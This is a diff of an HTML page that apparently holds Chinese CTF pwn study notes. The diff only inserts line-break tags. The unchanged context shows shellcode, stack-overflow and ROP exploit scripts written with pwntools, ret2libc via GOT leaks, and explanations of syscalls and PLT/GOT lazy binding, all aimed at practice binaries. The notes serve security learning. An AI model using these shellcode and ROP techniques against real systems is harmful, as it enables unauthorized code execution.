@@ -7924,7 +7924,7 @@ sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
 print shellcode.ljust(112,'A')
 sh.interactive()
 </code></pre>
-<p>上面是给出的 exp 等价于下面的，可以发现 shellcraft.sh() 可以生成 shellcode
+<p>上面是给出的 exp 等价于下面的，可以发现 shellcraft.sh() 可以生成 shellcode<br />
 shellcode.ljust(112,'a') 可以控制垃圾数据与 shellcode 合起来的长度为112</p>
 <pre><code class="language-python">#!/usr/bin/env python
 from pwn import *
@@ -7937,7 +7937,7 @@ sh.sendline(shellcode + p32(buf2_addr))
 sh.interactive()
 </code></pre>
 <h3 id="sniperoj-pwn100-shellcode-x86-64">sniperoj-pwn100-shellcode-x86-64：</h3>
-<p>23字节shellcode
+<p>23字节shellcode<br />
 "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</p>
 <p>首先根据 gdb 确定偏移，然后把因为有个 leave 指令会破坏前面的，所以前面的填充为脏数据，然后加上返回地址占据的 8 位空间，确定在 buf_addr 后面 24+8 填充 shellcode</p>
 <pre><code class="language-python">from pwn import *
@@ -7956,27 +7956,27 @@ sh.interactive()
 <p>关于系统调用的知识：</p>
 <blockquote>
 <p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p>
-<p><strong>应用程序调用系统调用的过程是：</strong>
-1、把<strong>系统调用的编号存入 EAX</strong>
-2、把<strong>函数参数存入其它通用寄存器</strong>
+<p><strong>应用程序调用系统调用的过程是：</strong><br />
+1、把<strong>系统调用的编号存入 EAX</strong><br />
+2、把<strong>函数参数存入其它通用寄存器</strong><br />
 3、<strong>触发 0x80 号中断</strong>（int 0x80）</p>
 </blockquote>
 <p>那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了</p>
 <p>如果说想通过系统调用执行的是：<code>execve("/bin/sh",NULL,NULL)</code>（32位程序）</p>
-<p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：
+<p>那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号：<br />
 <code>cat /usr/include/asm/unistd_32.h | grep execve</code></p>
 <p><img alt="image.png" src="../img/551835_tivk8k2gfwsw1e4g/1574326114023-1a1a7dd8-3b3b-4b26-b267-8ab853fc7a6e-443246.png" /></p>
 <p>得到 11，转换为 16 进制是 0xb，所以 eax 中应该存放 0xb</p>
 <p>ebx 应该存放想要执行的 /bin/sh 的地址，还有两个参数设置为 0</p>
 <p>所以现在需要做的就是让：</p>
 <blockquote>
-<p>eax=0xb
-ebx=/bin/sh 的地址
-ecx=0
+<p>eax=0xb<br />
+ebx=/bin/sh 的地址<br />
+ecx=0<br />
 edx=0</p>
 </blockquote>
 <p>只需要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的</p>
-<p>要用：<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> 来查找
+<p>要用：<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> 来查找<br />
 使用命令找到 pop eax：<code>ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'</code></p>
 <p><img alt="image.png" src="../img/551835_tivk8k2gfwsw1e4g/1574335064586-620aa890-57e1-4427-8846-51990871c55c-389520.png" /></p>
 <p>类似的，通过这条命令寻找控制其他寄存器的地址，找到可以控制多个的！</p>
@@ -8031,10 +8031,10 @@ p.sendline(bin_addr)
 p.interactive()
 </code></pre>
 <h4 id="2">例2</h4>
-<p>这一个没有了 "/bin/sh" 字符串，需要通过 gets 函数写到一个可读可写的地方，通常会找 bss 段，然后去执行 /bin/sh 
-通过查找，可以找到的数据如下：
-sys_addr=0x8048490
-get_addr=0x8048460
+<p>这一个没有了 "/bin/sh" 字符串，需要通过 gets 函数写到一个可读可写的地方，通常会找 bss 段，然后去执行 /bin/sh <br />
+通过查找，可以找到的数据如下：<br />
+sys_addr=0x8048490<br />
+get_addr=0x8048460<br />
 bss_addr=0x804A080</p>
 <p>通过这些数据可以写出 exp：</p>
 <pre><code class="language-python">from pwn import *
@@ -8050,10 +8050,10 @@ p.interactive()
 <h4 id="3">例3</h4>
 <p>没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址</p>
 <p>获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址</p>
-<p>总的来说：
-1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）
-2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system('/bin/sh')
-3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址
+<p>总的来说：<br />
+1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）<br />
+2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system('/bin/sh')<br />
+3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址<br />
 4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</p>
 <p>自己写的exp：</p>
 <pre><code class="language-python">#!/usr/bin/env python
@@ -8131,9 +8131,9 @@ p.sendline(payload2)
 p.interactive()
 </code></pre>
 <p>讲一下 <code>p.recvuntil('is ')</code> 代表的是 "is "之前的那一块，当下一个 recvuntil 的时候就会把这那块去掉了</p>
-<p>把脚本里的第一个 <code>p.recvuntil('is ')</code> 替换成 
-<code>print p.recvuntil('of ')</code>
-<code>print p.recvuntil('is ')</code>
+<p>把脚本里的第一个 <code>p.recvuntil('is ')</code> 替换成 <br />
+<code>print p.recvuntil('of ')</code><br />
+<code>print p.recvuntil('is ')</code><br />
 就可以看出来作用是什么</p>
 <p><img alt="image.png" src="../img/551835_tivk8k2gfwsw1e4g/1574586037138-97e8c208-e876-48ca-b9cd-0a64d829175f-322901.png" /></p>
 <p>ps.正常会输出这一些（"^C"是ctrl+c退出造成的，不包括）：</p>
@@ -8155,8 +8155,8 @@ int main(void)
     return 0;
 }
 </code></pre>
-<p>依次使用下列命令进行编译：
-<code>gcc -Wall -g -o test.o -c test.c -m32</code>
+<p>依次使用下列命令进行编译：<br />
+<code>gcc -Wall -g -o test.o -c test.c -m32</code><br />
 <code>gcc -o test test.o -m32</code></p>
 <p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p>
 <p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p>
@@ -8178,11 +8178,11 @@ printf_stub:
 ...
 printf函数的储存地址,这里储存printf函数重定位后的地址
 </code></pre>
-<p>总体来说，动态链接每个函数需要两个东西：
-1、用来存放外部函数地址的数据段
+<p>总体来说，动态链接每个函数需要两个东西：<br />
+1、用来存放外部函数地址的数据段<br />
 2、用来获取数据段记录的外部函数地址的代码</p>
-<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）
-<img alt="20160611124517413.jpg" src="../img/551835_tivk8k2gfwsw1e4g/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829-936151.jpeg" />
+<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）<br />
+<img alt="20160611124517413.jpg" src="../img/551835_tivk8k2gfwsw1e4g/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829-936151.jpeg" /><br />
 可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
 <p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>
 <h4 id="_1">延迟绑定</h4>
@@ -8235,13 +8235,13 @@ jmp    *0x804a008 //跳转到函数
 add    %al,(%eax)
     ...
 </code></pre>
-<p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0
+<p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0<br />
 <img alt="image.png" src="../img/551835_tivk8k2gfwsw1e4g/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc-754757.png" /></p>
-<p>当执行后他有了值
+<p>当执行后他有了值<br />
 <img alt="image.png" src="../img/551835_tivk8k2gfwsw1e4g/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf-551333.png" /></p>
 <p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p>
-<p>那现在做一个小总结：
-在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的
+<p>那现在做一个小总结：<br />
+在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的<br />
 xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p>
 <p>到这里我们还需要知道</p>
 <ol>
@@ -8254,14 +8254,14 @@ xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve<
 <p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p>
 <p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p>
 <blockquote>
-<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：
-<strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址 **
-</strong>got [1]：本 ELF 的 link_map 数据结构描述符地址 **
-<strong>got [2]：_dl_runtime_resolve 函数的地址</strong>
+<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：<br />
+<strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址 **<br />
+</strong>got [1]：本 ELF 的 link_map 数据结构描述符地址 **<br />
+<strong>got [2]：_dl_runtime_resolve 函数的地址</strong><br />
 动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>
 </blockquote>
 <p><strong>跟着大佬的流程图来走一遍：</strong></p>
-<p>第一次调用
+<p>第一次调用<br />
 <img alt="1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" src="../img/551835_tivk8k2gfwsw1e4g/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278-378789.jpeg" /></p>
 <p>之后再次调用<img alt="1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg" src="../img/551835_tivk8k2gfwsw1e4g/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c-066624.jpeg" /></p>
 <h3 id="practice">Practice</h3>
@@ -8270,7 +8270,7 @@ xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve<
 <p><img alt="1566026309029.png" src="../img/551835_tivk8k2gfwsw1e4g/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918-454091.png" /></p>
 <p>把 push 的那一些16进制转换一下</p>
 <p><img alt="image.png" src="../img/551835_tivk8k2gfwsw1e4g/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1-142391.png" /></p>
-<p>大佬说通过这些就可以构造出 payload 了
+<p>大佬说通过这些就可以构造出 payload 了<br />
 exp：我连不上。。。</p>
 <pre><code class="language-python">from pwn import *
 sh = remote('bamboofox.cs.nctu.edu.tw',10001)
@@ -8299,9 +8299,9 @@ p.sendline(payload1)
 p.interactive()
 </code></pre>
 <h4 id="defcon-2015-qualifier-r0pbaby">Defcon 2015 Qualifier: R0pbaby</h4>
-<p>checksec 检查一下，发现是64位程序，所以参数应该是存储在 rdi 寄存器上
-64 位程序当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-通过 ROPgadget --binary /libc/x86_64-linux-gnu/ libc.so.6 --only "pop|ret" | grep "rdi"
+<p>checksec 检查一下，发现是64位程序，所以参数应该是存储在 rdi 寄存器上<br />
+64 位程序当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9<br />
+通过 ROPgadget --binary /libc/x86_64-linux-gnu/ libc.so.6 --only "pop|ret" | grep "rdi"<br />
 获取到 pop rdi ；ret 的地址：</p>
 <p><img alt="image.png" src="../img/551835_tivk8k2gfwsw1e4g/1574663502432-70335a77-3256-4ba8-adf0-f7208c5b7ed7-952390.png" /></p>
 <p>通过程序自身提供的功能，可以获取到 libc 的地址与任意函数的地址</p>
